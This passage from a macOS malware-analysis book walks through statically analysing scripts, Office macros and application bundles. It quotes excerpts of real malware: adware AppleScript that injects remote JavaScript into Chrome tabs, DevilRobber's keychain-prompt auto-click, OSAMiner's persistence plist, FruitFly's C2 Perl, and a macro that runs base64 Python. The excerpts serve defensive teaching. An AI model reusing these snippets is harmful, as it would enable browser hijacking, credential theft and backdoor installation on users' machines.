<p>With the fully deobfuscated Python code in hand, we can continue our analysis by reading the script to figure out what it does. In the <code>wvn</code> class’s <code>__init__</code> method, we see references to various variables of interest <span aria-label="annotation1" class="CodeAnnotation">1</span>. Based on their names (and continued analysis) we conclude such variables contain the name of a base64-encoded file (<em>ij1.b64</em>), an XOR encryption key (<code>1bm5pbmcKc</code>), and an “injection” URL (<em>https://1049434604.rsc.cdn77.org/ij1.min.js</em>). The latter, as you’ll see, gets locally injected into user webpages in order to load malicious JavaScript. In the <code>wvR</code> method, the code checks if the script was invoked with the <code>f=</code> command line option <span aria-label="annotation2" class="CodeAnnotation">2</span>. If so, it sets the <code>B64_ENC_FILE</code> variable to the specified file <span aria-label="annotation3" class="CodeAnnotation">3</span>. On an infected system, the script was persistently invoked with <code>python 5mLen f=6bLJC</code>, meaning the <code>B64_ENC_FILE</code> will be set to <code>6bLJC</code>.</p>
<p>Taking a peek at the <code>6bLJC</code> file reveals it is encoded, or possibly encrypted. Though we might be able to manually decode it (as we have an <code>XOR</code> key, <code>1bm5pbmcKc</code>), there is a simpler way. Again, by inserting a <code>print</code> statement <span epub:type="pagebreak" id="Page_82" title="82"/>immediately after the logic that decodes the contents of the file, we can coerce the malware to output the decoded contents. This output turns out to be yet another script that the malware executes. However, this script is not Python, but rather AppleScript, which we’ll explore in the next section. For a more detailed walkthrough of the static analysis of this malware, see my write-up “Mac Adware, à la Python.”<sup class="endnote"><a href="#c04-endnote-10" id="c04-noteref-10">10</a></sup></p>
<h3 id="h2-501942c04-0005">AppleScript</h3>
<p class="BodyFirst">AppleScript is a macOS-specific scripting language generally used for benign purposes, and often for system administration, such as task automation or to interact with other applications on the system. By design, its grammar is rather close to spoken English. For example, to display a dialog with an alert (<a href="#listing4-15" id="listinganchor4-15">Listing 4-15</a>), you can simply write:</p>
<pre><code>display dialog "Hello, World!"</code></pre>
<p class="CodeListingCaption"><a id="listing4-15">Listing 4-15</a>: “Hello, World!” in AppleScript</p>
<p>You can execute these scripts via the <code>/usr/bin/osascript</code> command. AppleScripts can be distributed in their raw, human-readable form or compiled. The former case uses the <em>.applescript</em> extension, while the latter normally uses a <em>.scpt</em> extension, as shown in <a href="#listing4-16" id="listinganchor4-16">Listing 4-16</a>:</p>
<pre><code>% <b>file helloWorld.scpt</b> <br/>helloWorld.scpt: AppleScript compiled</code></pre>
<p class="CodeListingCaption"><a id="listing4-16">Listing 4-16</a>: Using <code>file</code> to identify compiled AppleScript</p>
<p>And unless the script has been compiled with the “run-only” option (more on this later), Apple’s Script Editor can reconstruct the source code from compiled scripts. For example, <a href="#figure4-8" id="figureanchor4-8">Figure 4-8</a> shows the Script Editor successfully decompiling our compiled “Hello, World!” script.</p>
<figure>
<img alt="AppleScript has decompiled the script HELLOWORLD.SCPT, shown by “display dialog: ‘Hello World!’”" class="keyline" src="image_fi/501942c04/f04008_new.png"/>
<figcaption><p><a id="figure4-8">Figure 4-8</a>: Apple’s Script Editor</p></figcaption>
</figure>
<p>You can also decompile scripts via macOS’s built-in <code>osadecompile</code> command (<a href="#listing4-17" id="listinganchor4-17">Listing 4-17</a>): </p>
<pre><code>% <b>osadecompile helloWorld.scpt</b><br/>display dialog "Hello, World!"</code></pre>
<p class="CodeListingCaption"><a id="listing4-17">Listing 4-17</a>: “Hello, World!” via AppleScript </p>
<p><span epub:type="pagebreak" id="Page_83" title="83"/>Let’s start by discussing an easy example. Earlier in this chapter, we discussed a Python-compiled adware specimen and noted that it contained an AppleScript component. The Python code decrypts this AppleScript stored in the <code>wvd.PLAIN_TEXT_SCRIPT </code>variable and then executes it via a call to the <code>osascript</code> command. <a href="#listing4-18" id="listinganchor4-18">Listing 4-18</a> shows the AppleScript:</p>
<pre><code>global _keep_running<br/>set _keep_running to "1"<br/><br/>repeat until _keep_running = "0"<br/>  «event XFdrIjct» {}<br/>end repeat<br/><br/>on «event XFdrIjct» {}<br/>  delay 0.5<br/>  try<br/>    if is_Chrome_running() then<br/>      tell application "Google Chrome" to tell active tab of window 1 <span aria-label="annotation1" class="CodeAnnotationCode">1</span><br/>        set sourceHtml to execute javascript "document.getElementsByTagName('head')[0].<br/>        innerHTML"<br/>        if sourceHtml does not contain "493024ui5o" then<br/>          tell application "Google Chrome" to execute front window's active tab javascript <span aria-label="annotation2" class="CodeAnnotationCode">2</span><br/>          "var pidDiv = document.createElement('div'); pidDiv.id = \"493024ui5o\"; <br/>          pidDiv.style = \"display:none\"; pidDiv.innerHTML = <br/>          \"bbdd05eed40561ed1dd3daddfba7e1dd\";<br/>          document.getElementsByTagName('head')[0].appendChild(pidDiv);"<br/>          tell application "Google Chrome" to execute front window's active tab javascript <br/>          "var js_script = document.createElement('script'); js_script.type = \"text/<br/>          javascript\"; js_script.src = \"https://1049434604.rsc.cdn77.org/ij1.min.js\"; <span aria-label="annotation3" class="CodeAnnotationCode">3</span><br/>          document.getElementsByTagName('head')[0].appendChild(js_script);"<br/>        end if<br/>      end tell<br/>    else<br/>      set _keep_running to "0"<br/>    end if<br/>  end try<br/>end «event XFdrIjct»<br/><br/>on is_Chrome_running()<br/>  tell application "System Events" to (name of processes) contains "Google Chrome" <span aria-label="annotation4" class="CodeAnnotationCode">4</span><br/>end is_Chrome_running</code></pre>
<p class="CodeListingCaption"><a id="listing4-18">Listing 4-18</a>: Malicious AppleScript (unspecified adware)</p>
<p>In short, this AppleScript invokes an <code>is_Chrome_running</code> function to check if Google Chrome is running by asking the operating system if the process list contains <code>"Google Chrome"</code> <span aria-label="annotation4" class="CodeAnnotation">4</span>. If it does, the script grabs the HTML code of the page in the active tab, and checks for an injection marker: <code>493024ui5o</code> <span aria-label="annotation1" class="CodeAnnotation">1</span>. If this marker is not found, the script injects and executes two pieces of JavaScript <span aria-label="annotation2" class="CodeAnnotation">2</span>. From our analysis, we can ascertain that the ultimate goal of this AppleScript-injected-JavaScript is to load and execute another malicious JavaScript file, <em>ij1.min.js</em>, from <em>https://1049434604.rsc.cdn77.org/ </em>in the user’s browser <span aria-label="annotation3" class="CodeAnnotation">3</span>. Unfortunately, as this URL was offline at the time of <span epub:type="pagebreak" id="Page_84" title="84"/>analysis, we cannot know exactly what the script would do, although malware like this typically injects ads or pop-ups in a user’s browser session in order to generate revenue for its authors. Of course, injected JavaScript could easily perform more nefarious actions, such as capturing passwords or piggybacking on authenticated user sessions. </p>
<p>A rather archaic example of Mac malware that abused AppleScript is DevilRobber.<sup class="endnote"><a href="#c04-endnote-11" id="c04-noteref-11">11</a></sup> Though this malware focused primarily on stealing Bitcoins and mining cryptocurrencies, it also targeted the user’s keychain in order to extract accounts, passwords, and other sensitive information. In order to access the keychain, DevilRobber had to bypass the keychain access prompt, and it did so via AppleScript. </p>
<p>Specifically, DevilRobber executed a malicious AppleScript file named <em>kcd.scpt</em> via macOS’s built-in<code> osascript</code> utility. This script sent a synthetic mouse click event to the Always Allow button of the keychain access prompt, allowing the malware to access the contents of the keychain (<a href="#figure4-9" id="figureanchor4-9">Figure 4-9</a>).</p>
<figure>
<img alt="DevilRobber’s synthetic mouse click event shows a pop-up window that states, “security wants to access key ‘ids: identity-rsa-private-key’ in your keychain. Do you want to allow access to this item?” and has three clickable options: Always Allow, Deny, and Allow. " class="keyline" src="image_fi/501942c04/f04009_new.png"/>
<figcaption><p><a id="figure4-9">Figure 4-9</a>: Synthetic click via AppleScript (DevilRobber)</p></figcaption>
</figure>
<p>The AppleScript used to perform this synthetic mouse click is straightforward; it simply tells the <code>SecurityAgent</code> process, which owns the keychain access window, to click the Always Allow button (<a href="#listing4-19" id="listinganchor4-19">Listing 4-19</a>): </p>
<pre><code>...<br/>tell window 1 of process "SecurityAgent" <br/>     click button "Always Allow" of group 1<br/>end tell</code></pre>
<p class="CodeListingCaption"><a id="listing4-19">Listing 4-19</a>: Synthetic click via AppleScript (DevilRobber)</p>
<p>The readability of the AppleScript grammar, coupled with the ability of Apple’s Script Editor to parse and often decompile such scripts, makes analysis of malicious AppleScripts quite simple. From an attacker’s point of view, the extreme readability of AppleScript is a rather large negative, as it means malware analysts can easily understand any malicious script. As noted earlier, though, attackers can export AppleScripts as run-only (<a href="#figure4-10" id="figureanchor4-10">Figure 4-10</a>). Unfortunately, the Script Editor cannot decompile AppleScripts exported via the run-only option, (or via the <code>osacompile</code> command with the <code>-x</code> option), complicating certain analyses.</p>
<span epub:type="pagebreak" id="Page_85" title="85"/><figure>
<img alt="The helloWorld.scpt can be exported as run-only through AppleScripts. AppleScript’s exporting screen shows helloWorld.scpt renamed to be exported as helloWorld_RO.scpt, with the file format set as “Script.” Of the options “Show startup screen,” “Stay open after run handler,” and “Run-only,” only the latter is selected. Under Code Sign, “Don’t Code Sign” is selected." class="" src="image_fi/501942c04/f04010.png"/>
<figcaption><p><a id="figure4-10">Figure 4-10</a>: Generating a run-only AppleScript</p></figcaption>
</figure>
<p>Run-only AppleScript files are not human readable, nor are they decompilable via <code>osadecompile</code>. As you can see in <a href="#listing4-20" id="listinganchor4-20">Listing 4-20</a>, an attempt to decompile a run-only script causes an <code>errOSASourceNotAvailable</code> error:</p>
<pre><code>%<b> file helloWorld_RO.scpt</b> <br/>helloWorld_RO: AppleScript compiled<br/><br/>% <b>less helloWorld_RO.scpt</b><br/>"helloWorld_RO" may be a binary file.  See it anyway? <b>Y</b><br/><br/>FasdUAS 1.101.10^N^@^@^@^D^O&lt;FF&gt;&lt;FF&gt;&lt;FF&gt;&lt;FE&gt;^@^A^@^B^A&lt;FF&gt;&lt;FF&gt;^@^@^A&lt;FF&gt;&lt;FE&gt;^@^@^N^@^A^@^@^O^P^@^B^@^C&lt;FF&gt;&lt;FD&gt;^@^C^@^D^A&lt;FF&gt;&lt;FD&gt;^@^@^P^@^C^@^A&lt;FF&gt;&lt;FC&gt;<br/>&lt;FF&gt;&lt;FC&gt;^@^X.aevtoappnull^@^@&lt;80&gt;^@^@^@&lt;90&gt;^@****^N^@^D^@^G^P&lt;FF&gt;&lt;FB&gt;&lt;FF&gt;...<br/><br/>% <b>osadecompile helloWorld_RO.scpt</b> <br/>osadecompile: helloWorld_RO.scpt: errOSASourceNotAvailable (-1756).</code></pre>
<p class="CodeListingCaption"><a id="listing4-20">Listing 4-20</a>: Decompiling a run-only AppleScript via <code>osadecompile</code> fails</p>
<p>An example of a Mac malware specimen that leverages run-only AppleScript is OSAMiner, which Mac malware researcher Phil Stokes thoroughly examined in “Adventures in Reversing Malicious Run-Only AppleScripts.”<sup class="endnote"><a href="#c04-endnote-12" id="c04-noteref-12">12</a></sup> In doing so, he presented a comprehensive list of techniques for analyzing run-only AppleScript files. His write-up noted that OSAMiner installs a launch item that persists an AppleScript. This launch item is shown in <a href="#listing4-21" id="listinganchor4-21">Listing 4-21</a>. Note that the values in the <code>ProgramArguments</code> key will instruct macOS to invoke the <code>osascript</code> command to execute an AppleScript file named <em>com.apple.4V.plist </em><span aria-label="annotation1" class="CodeAnnotation">1</span>:</p>
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" ...&gt;<br/>&lt;plist version="1.0"&gt;<br/>&lt;dict&gt;<br/>  &lt;key&gt;Label&lt;/key&gt;<br/>  &lt;string&gt;com.apple.FY9&lt;/string&gt;<br/><span epub:type="pagebreak" id="Page_86" title="86"/>  &lt;key&gt;Program&lt;/key&gt;<br/>  &lt;string&gt;/usr/bin/osascript&lt;/string&gt;<br/> <span aria-label="annotation1" class="CodeAnnotationCode2">1</span> &lt;key&gt;ProgramArguments&lt;/key&gt; <br/>  &lt;array&gt;<br/>      &lt;string&gt;osascript&lt;/string&gt;<br/>      &lt;string&gt;-e&lt;/string&gt;<br/>      &lt;string&gt;do shell script "osascript <br/>      ~/Library/LaunchAgents/com.apple.4V.plist"&lt;/string&gt;<br/> &lt;/array&gt;<br/> &lt;key&gt;RunAtLoad&lt;/key&gt;<br/> &lt;true/&gt;<br/> ...<br/>&lt;/dict&gt;<br/>&lt;/plist&gt;</code></pre>
<p class="CodeListingCaption"><a id="listing4-21">Listing 4-21</a>: A persistent launch item plist (OSAMiner)</p>
<p>Running the <code>file</code> and <code>osadecompile</code> commands confirm the persisted item, <em>com.apple.4V.plist</em>, is a run-only AppleScript that cannot be decompiled via macOS’s built-in tools (<a href="#listing4-22" id="listinganchor4-22">Listing 4-22</a>):</p>
<pre><code>% <b>file com.apple.4V.plist</b> <br/>com.apple.4V.plist: AppleScript compiled<br/><br/>% <b>osadecompile com.apple.4V.plist</b> <br/>osadecompile: com.apple.4V.plist: errOSASourceNotAvailable (-1756).</code></pre>
<p class="CodeListingCaption"><a id="listing4-22">Listing 4-22</a>: Decompiling run-only AppleScript via <code>osadecompile</code> fails (OSAMiner)</p>
<p>Luckily, we can turn to an open source AppleScript disassembler created by Jinmo.<sup class="endnote"><a href="#c04-endnote-13" id="c04-noteref-13">13</a></sup> After installing this disassembler, we can disassemble the <em>com.apple.4V.plist</em> file (<a href="#listing4-23" id="listinganchor4-23">Listing 4-23</a>):</p>
<pre><code>% <b>ASDisasm/python disassembler.py OSAMiner/com.apple.4V.plist</b> <br/><br/>=== data offset 2 ===<br/>Function name : e<br/>Function arguments:  ['_s']<br/> ...<br/> 00013 RepeatInCollection &lt;disassembler not implemented&gt; <br/> ...<br/> 00016 PushVariable [var_2]<br/> 00017 PushLiteral 4 # &lt;Value type=fixnum value=0x64&gt; <br/> 00018 Add <br/><br/>=== data offset 3 ===<br/>Function name : d<br/>Function arguments:  ['_s']<br/> ...<br/> 00013 RepeatInCollection &lt;disassembler not implemented&gt; <br/> ...<br/> 00016 PushVariable [var_2] <br/> 00017 PushLiteral 4 # &lt;Value type=fixnum value=0x64&gt; <br/> 00018 Subtract </code></pre>
<p class="CodeListingCaption"><a id="listing4-23">Listing 4-23</a>: Decompiling run-only AppleScript via the AppleScript disassembler</p>
<p><span epub:type="pagebreak" id="Page_87" title="87"/>The disassembler breaks out the run-only AppleScript into various functions (called<em> handlers</em> in AppleScript parlance). For example, we can see a function named <code>e</code> (“encode”?) adding 0x64 to an item in a loop, while the <code>d</code> (“decode”?)<code> </code>function appears to do the inverse by subtracting 0x64. The latter, <code>d</code>, is invoked several times elsewhere in the code, to deobfuscate various strings. </p>
<p>Still, the disassembly leaves much to be desired. For example, in various places within the code, the disassembler does not sufficiently extract hardcoded strings in a human-readable manner. To address its shortcomings, Stokes created his own open source AppleScript decompiler named <code>aevt_decompile</code>.<sup class="endnote"><a href="#c04-endnote-14" id="c04-noteref-14">14</a></sup> This decompiler takes as input the output from the AppleScript disassembler (<a href="#listing4-24" id="listinganchor4-24">Listing 4-24</a>):</p>
<pre><code>% <b>ASDisasm/disassembler.py OSAMiner/com.apple.4V.plist &gt; com.apple.4V.disasm</b><br/><br/>% <b>aevt_decompile ASDisasm/com.apple.4V.disasm</b></code></pre>
<p class="CodeListingCaption"><a id="listing4-24">Listing 4-24</a>: Decompiling run-only AppleScripts via an AppleScript disassembler and <code>aevt_decompile</code></p>
<p>The <code>aevt_decompile</code> decompiler produces output that is more conducive to analysis. For example, it extracts hardcoded strings and makes them readable while correctly identifying and annotating Apple Event codes. Armed with the decompiled AppleScript, analysis can continue. In his write-up, Stokes noted that the malware would write out an embedded AppleScript to <em>~/Library/k.plist</em> and then execute it. Looking through the decompiled code, we can identify this logic (<a href="#listing4-25" id="listinganchor4-25">Listing 4-25</a>): </p>
<pre><code>% <b>less com.apple.4V.disasm.out</b><br/>...<br/><br/>=== data offset 5 ===<br/>Function name :  'Open Application' <br/>...<br/><br/> ;Decoded String "~/Library/k.plist"<br/> 000e0 PushLiteralExtended 36 # &lt;Value type=string value='\x00\x8b\x00\x84...'&gt; <br/><br/> ...<br/><br/> ;&lt;command name="do shell script" code="sysoexec" description="Execute a shell script <br/> using the 'sh' shell"&gt; --&gt; in StandardAdditions.sdef<br/>  000e9 MessageSend 37 # &lt;Value type=event_identifier value='syso'-'exec'-...&gt; <span aria-label="annotation1" class="CodeAnnotationCode">1</span><br/><br/> ...<br/><br/> ;Decoded String "osascript ~/Library/k.plist &gt; /dev/null 2&gt; /dev/null &amp; "<br/>  000ee PushLiteralExtended 38 # &lt;Value type=string value='\x00\xd3\x00\xd7...'&gt;] <span aria-label="annotation2" class="CodeAnnotationCode">2</span></code></pre>
<p class="CodeListingCaption"><a id="listing4-25">Listing 4-25</a>: Further decompiling run-only AppleScript via <code>aevt_decompile</code> (OSAMiner)</p>
<p>As you can see, the code writes out the embedded script via a call to the <code>do shell script</code> command <span aria-label="annotation1" class="CodeAnnotation">1</span>. Then it executes this script with the <code>osascript</code> command (redirecting any output or errors to <code>/dev/null</code>) <span aria-label="annotation2" class="CodeAnnotation">2</span>.</p>
<p><span epub:type="pagebreak" id="Page_88" title="88"/>Reading through the rest of the decompiled AppleScript reveals the remaining capabilities of this component of the OSAMiner malware. For a continued discussion on how malware authors abuse AppleScript, see “How AppleScript Is Used for Attacking macOS.”<sup class="endnote"><a href="#c04-endnote-15" id="c04-noteref-15">15</a></sup></p>
<h3 id="h2-501942c04-0006">Perl Scripts</h3>
<p class="BodyFirst">In the world of macOS malware, Perl is not a common scripting language. However, at least one infamous macOS malware specimen was written in Perl: FruitFly. Created in the mid-2000s, it remained undetected in the wild for almost 15 years. FruitFly’s main persistent component, most commonly named <em>fpsaud</em>, was written in Perl (<a href="#listing4-26" id="listinganchor4-26">Listing 4-26</a>):</p>
<pre><code>#!/usr/bin/perl<br/>use strict;use warnings;use IO::Socket;use IPC::Open2;my$l;sub G{die if!defined syswrite$l,$_[0]}sub J{my($U,$A)=('','');while($_[0]&gt;length$U){die if!sysread$l,$A,$_[0]-length$U;$U.=$A;}return$U;}sub O{unpack'V',J 4}sub N{J O}sub H{my$U=N;$U=~s/\\/\//g;$U}subI{my$U=eval{my$C=`$_[0]`;chomp$C;$C};$U=''if!defined$U;$U;}sub K{$_[0]?v1:v0}sub Y{pack'V',$_[0]}sub B{pack'V2',$_[0]/2**32,$_[0]%2**32} ...</code></pre>
<p class="CodeListingCaption"><a id="listing4-26">Listing 4-26</a>: Obfuscated Perl (FruitFly)</p>
<p>Like other scripting languages, programs written in Perl are generally distributed as scripts rather than compiled. Thus, analyzing them is relatively straightforward. However, in the case of FruitFly, the malware author attempted to complicate the analysis by removing unnecessary whitespace in the code and renaming variables and subroutines using nonsensical single-letter names, a common tactic for both obfuscating and minimizing the code. </p>
<p>Leveraging any one of various online Perl “beautifiers,” we can reformat the malicious script and produce more readable code, as in <a href="#listing4-27" id="listinganchor4-27">Listing 4-27</a> (though the names of variables and subroutines remain nonsensical):</p>
<pre><code>#!/usr/bin/perl<br/>use strict;<br/>use warnings;<br/>use IO::Socket;<br/>use IPC::Open2;<br/>...<br/><span aria-label="annotation1" class="CodeAnnotationHang">1</span> $l = new IO::Socket::INET(PeerAddr =&gt; scalar(reverse $g), <br/>                          PeerPort =&gt; $h, <br/>                          Proto =&gt; 'tcp', <br/>                          Timeout =&gt; 10);<br/><br/>G v1.Y(1143).Y($q ? 128 : 0).Z(($z ? I('scutil --get LocalHostName') : '') || <br/><span aria-label="annotation2" class="CodeAnnotationCode">2</span> I('hostname')).Z(I('whoami'));<br/><br/>for (;;) { <br/>  ...<br/><span aria-label="annotation3" class="CodeAnnotationCode">3</span> $C = `ps -eAo pid,ppid,nice,user,command 2&gt;/dev/null`<br/>  if (!$C) {<br/><span epub:type="pagebreak" id="Page_89" title="89"/>      push@ v, [0, 0, 0, 0, "*** ps failed ***"]<br/>  }<br/>  ...</code></pre>
<p class="CodeListingCaption"><a id="listing4-27">Listing 4-27</a>: Beautified, though still somewhat obfuscated, Perl (FruitFly)</p>
<p>The beautified Perl script still isn’t the easiest thing to read, but with a little patience, we can deduce the malware’s full capabilities. First, the script imports various Perl modules with the <code>use</code> keyword. These modules provide hints as to what the script is up to: the <code>IO:Socket</code> module indicates network capabilities, while the <code>IPC:Open2</code> module suggests that the malware interacts with processes.</p>
<p>A few lines later, the script invokes <code>IO::Socket::INET</code> to create a connection to the attacker’s remote command and control server <span aria-label="annotation1" class="CodeAnnotation">1</span>. Next, we can see that it invokes the built-in <code>scutil</code>, <code>hostname</code>, and <code>whoami</code> commands <span aria-label="annotation2" class="CodeAnnotation">2</span>, which the malware likely uses to generate a basic survey of the infected macOS system. </p>
<p>Elsewhere in the code, the malware invokes other system commands to provide more capabilities. For example, it invokes the <code>ps</code> command to generate a process listing <span aria-label="annotation3" class="CodeAnnotation">3</span>. This approach, of focusing on the commands invoked by the malware’s Perl code, provides sufficient insight into its capabilities. For a comprehensive analysis of this threat, see my research paper, “Offensive Malware Analysis: Dissecting OSX/FruitFly.”<sup class="endnote"><a href="#c04-endnote-16" id="c04-noteref-16">16</a></sup> </p>
<h2 id="h1-501942c04-0004">Microsoft Office Documents</h2>
<p class="BodyFirst">Malware researchers who analyze Windows malware are quite likely to encounter malicious, macro-laden Microsoft Office documents. Unfortunately, opportunistic malware authors have recently stepped up efforts to infect Office documents aimed at Mac users, too. These documents might contain only Mac-specific macro code or both Windows-specific and Mac-specific code, making them cross platform. </p>
<p>We briefly discussed malicious Office documents in <span class="xref" itemid="xref_target_Chapter 1">Chapter 1</span>. Recall that macros provide a way to make a document dynamic, typically by adding executable code to the Microsoft Office documents. Using the <code>file</code> command, you can readily identify Microsoft Office documents (<a href="#listing4-28" id="listinganchor4-28">Listing 4-28</a>):</p>
<pre><code>% <b>file "U.S. Allies and Rivals Digest Trump's Victory.docm"</b><br/>U.S. Allies and Rivals Digest Trump's Victory.docm: Microsoft Word 2007+</code></pre>
<p class="CodeListingCaption"><a id="listing4-28">Listing 4-28</a>: Using <code>file</code> to identify an Office document </p>
<p>The <em>.docm</em> extension is a good indication that a file contains macros. Beyond this, determining whether the macros are malicious takes a tad more effort. Various tools can assist in this static analysis. The oletools toolset is one of the best.<sup class="endnote"><a href="#c04-endnote-17" id="c04-noteref-17">17</a></sup> Free and open source, it contains various Python scripts created to facilitate the analysis of Microsoft Office documents and other OLE files.</p>
<p>This toolset includes the <code>olevba</code> utility designed to extract embedded macros from Office documents. After installing oletools via pip, execute <code>olevba</code> with the <code>-c</code> flag and the path to the macro-laden document. If the <span epub:type="pagebreak" id="Page_90" title="90"/>document contains macros, they will be extracted and printed to standard out (<a href="#listing4-29" id="listinganchor4-29">Listing 4-29</a>):</p>
<pre><code>% <b>sudo pip3 install -U oletools</b><br/>% <b>olevba -c</b><b> </b><var class="bold">&lt;path/to/document&gt;</var><br/><br/>VBA MACRO ThisDocument.cls <br/>in file: word/vbaProject.bin<br/>...</code></pre>
<p class="CodeListingCaption"><a id="listing4-29">Listing 4-29</a>: Using <code>olevba</code> to extract macros </p>
<p>For example, let’s take a closer look at a malicious Office document called <em>U.S. Allies and Rivals Digest Trump’s Victory.docm</em> that was sent to unsuspecting Mac users shortly after the 2016 US presidential election. First, we use <code>olevba</code> to both confirm the presence of, and extract, the document’s embedded macros (<a href="#listing4-30" id="listinganchor4-30">Listing 4-30</a>):</p>
<pre><code>% <b>olevba -c "U.S. Allies and Rivals Digest Trump's Victory.docm"</b><br/><br/>VBA MACRO ThisDocument.cls <br/>in file: word/vbaProject.bin<br/><br/>- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -<br/><br/><span aria-label="annotation1" class="CodeAnnotationHang">1</span> Sub autoopen()<br/>    Fisher<br/>End Sub<br/><br/>Public Sub Fisher()<br/><br/>    Dim result As Long<br/>    Dim cmd As String<br/>  <span aria-label="annotation2" class="CodeAnnotationCode2">2</span> cmd = "ZFhGcHJ2c2dNQlNJeVBmPSdhdGZNelpPcVZMYmNqJwppbXBvcnQgc3"<br/>    cmd = cmd + "NsOwppZiBoYXNhdHRyKHNzbCwgJ19jcmVhdGVfdW52ZXJpZm"<br/>    ...<br/>    result = system("echo ""import sys,base64;exec(base64.b64decode(                    <br/>                   <span aria-label="annotation3" class="CodeAnnotationCode">3</span> \"" " &amp; cmd &amp; " \""));"" | python &amp;")<br/>End Sub</code></pre>
<p class="CodeListingCaption"><a id="listing4-30">Listing 4-30</a>: Using <code>olevba</code> to extract malicious macros</p>
<p>If you open an Office document containing macros and enable macros, code within subroutines such as <code>AutoOpen</code>, <code>AutoExec</code>, or <code>Document_Open</code> will run automatically. As you can see, this “Trump’s Victory” document contains macro code in one of these subroutines <span aria-label="annotation1" class="CodeAnnotation">1</span>. Macro subroutine names are case-insensitive (for example, <code>AutoOpen</code> and <code>autoopen</code> are equivalent). For more details on subroutines that are automatically invoked, see Microsoft’s developer documentation “Description of behaviors of AutoExec and AutoOpen macros in Word.”<sup class="endnote"><a href="#c04-endnote-18" id="c04-noteref-18">18</a></sup></p>
<p>In this example, the code within the <code>autoopen</code> subroutine invokes a subroutine named <code>Fisher</code> that builds a large base64-encoded string, stored in a variable named <code>cmd</code> <span aria-label="annotation2" class="CodeAnnotation">2</span>, before invoking the system API and passing this string to Python for execution <span aria-label="annotation3" class="CodeAnnotation">3</span>. Decoding the embedded string confirms <span epub:type="pagebreak" id="Page_91" title="91"/>that it’s Python code, which is unsurprising considering the macro code hands it off to Python. Entering various parts of the Python code in a search engine quickly reveals it is a well-known open source post-exploitation agent, Empyre.<sup class="endnote"><a href="#c04-endnote-19" id="c04-noteref-19">19</a></sup></p>
<p>Now we know that the goal of the malicious macro code is to download and execute to a fully featured interactive backdoor. Handing off control to some other malware is a common theme in macro-based attacks; after all, who wants to write a complete backdoor in VBA? For a thorough technical analysis of this macro attack, including a link to the malicious document, see “New Attack, Old Tricks: Analyzing a malicious document with a mac-specific payload.”<sup class="endnote"><a href="#c04-endnote-20" id="c04-noteref-20">20</a></sup></p>
<p>Sophisticated APT groups, such as the Lazarus Group, also leverage malicious Office documents. For example, in <span class="xref" itemid="xref_target_Chapter 1">Chapter 1</span> we analyzed a macro used to target macOS users in South Korea and discovered that it downloaded and executed a second-stage payload. The downloaded payload, <em>mt.dat</em>, turned out to be the malware known as Yort, a Mach-O binary that implements standard backdoor capabilities. For a comprehensive technical analysis of this malicious document and attack as a whole, see either my analysis “OSX.Yort” or the write-up “Lazarus Apt Targets Mac Users With Poisoned Word Document.”<sup class="endnote"><a href="#c04-endnote-21" id="c04-noteref-21">21</a></sup></p>
<h2 id="h1-501942c04-0005">Applications</h2>
<p class="BodyFirst">Attackers often package Mac malware in malicious applications. Applications are a file format familiar to all Mac users, so a user may not think twice before running one. Moreover, as applications are tightly integrated with macOS, a double-click may be sufficient to fully infect a Mac system (although since macOS Catalina, notarization requirements do help prevent certain inadvertent infections).</p>
<p>Behind the scenes, an application is actually a directory, albeit one with a well-defined structure. In Apple parlance, we refer to this directory as an <em>application bundle</em>. You can view the contents of an application bundle (such as the malware WindTail) in Finder by CTRL-clicking an application’s icon and selecting <b>Show Package Contents</b> (<a href="#figure4-11" id="figureanchor4-11">Figure 4-11</a>).</p>
<figure class="graphic">
<img alt="f04011_1" src="image_fi/501942c04/f04011_1.png"/></figure>

<figure>
<img alt="After selecting “Show [WindTail’s] Package Contents” in Finder, a new screen opens that shows the folders inside the Contents folder: _CodeSignature, MacOS, and Resources. The MacOS folder contains USRNODE, a Unix Executable File." class="keyline" src="image_fi/501942c04/f04011_2.png"/>
<figcaption><p><a id="figure4-11">Figure 4-11</a>: Viewing the contents of an application bundle (WindTail)</p></figcaption>
</figure>
<p><span epub:type="pagebreak" id="Page_92" title="92"/>However, a more comprehensive approach is to leverage the free Apparency application, which was designed specifically for the task of statically analyzing application bundles (<a href="#figure4-12" id="figureanchor4-12">Figure 4-12</a>).<sup class="endnote"><a href="#c04-endnote-22" id="c04-noteref-22">22</a></sup> In its user interface, you can browse components of the application to gain valuable insight into all aspects of the bundle, including identifier and version information, code-signing, and other security features, and information about the application’s main executable and frameworks.</p>
<figure>
<img alt="In Apparency, highlighting the WindTail application shows a list of information, including its location, identifier (“com.alis.tre”), version (“1.0 [1]”), gatekeeper (“Can’t evaluate”), and who it was signed by (“Untrusted certificate”). Clicking the WindTail application opens a new window showing its Info Property List." class="" src="image_fi/501942c04/f04012.png"/>
<figcaption><p><a id="figure4-12">Figure 4-12</a>: Using Apparency to view the contents of an application bundle (WindTail)</p></figcaption>
</figure>
<p>Yet Apparency, as noted in its user guide, doesn’t show every file inside the app bundle. Thus, you might find the terminal useful for viewing all of the application bundle’s files (<a href="#listing4-31" id="listinganchor4-31">Listing 4-31</a>):</p>
<pre><code>% <b>find Final_Presentation.app/</b><br/>Final_Presentation.app/<br/>Final_Presentation.app/Contents<br/>Final_Presentation.app/Contents/_CodeSignature<br/>Final_Presentation.app/Contents/_CodeSignature/CodeResources<br/><br/>Final_Presentation.app/Contents/MacOS<br/>Final_Presentation.app/Contents/MacOS/usrnode<br/><br/>Final_Presentation.app/Contents/Resources<br/>Final_Presentation.app/Contents/Resources/en.lproj<br/>Final_Presentation.app/Contents/Resources/en.lproj/MainMenu.nib<br/>Final_Presentation.app/Contents/Resources/en.lproj/InfoPlist.strings<br/>Final_Presentation.app/Contents/Resources/en.lproj/Credits.rtf<br/>Final_Presentation.app/Contents/Resources/PPT3.icns<br/><br/>Final_Presentation.app/Contents/Info.plist</code></pre>
<p class="CodeListingCaption"><a id="listing4-31">Listing 4-31</a>: Using <code>find</code> to view the contents of an application bundle (WindTail)</p>
<p><span epub:type="pagebreak" id="Page_93" title="93"/>Standard application bundles include the following files and subdirectories:</p>
<ul>
<li><em>Contents/</em>: A directory that contains all files and subdirectories of the application bundle.</li>
<li><em>Contents/_CodeSignature</em>: If the application is signed, contains code-signing information about the application (like hashes).</li>
<li><em>Contents/MacOS</em>: A directory that contains the application’s binary, which is what executes when the user double-clicks the application icon in the user interface. </li>
